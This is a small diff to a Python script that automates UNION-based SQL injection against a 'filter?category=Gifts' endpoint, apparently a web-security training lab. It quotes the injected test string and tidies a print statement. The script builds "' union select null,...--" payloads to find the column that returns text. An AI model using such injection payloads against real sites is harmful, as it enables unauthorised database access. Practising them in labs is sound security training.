@@ -32,7 +32,7 @@ def find_text(url, num_cols):
   path = "filter?category=Gifts"
 
   for i in range(1, num_cols):
-      str = "1337"
+      str = "'1337'"
       payload_list = ['null'] * num_cols
       payload_list[i - 1] = str
       sql_payload = "' union select " + ','.join(payload_list) + "--"
@@ -56,7 +56,7 @@ def main():
         print("(-> Number of columns: " + str(num_cols))
         string_col = find_text(url, num_cols)
         if string_col:
-            print("(-> the column that contains text is " + (string_col))
+            print("(-> the column that contains text is " + string_col)
         else:
             print("(-) SQLi attack not successful")
 
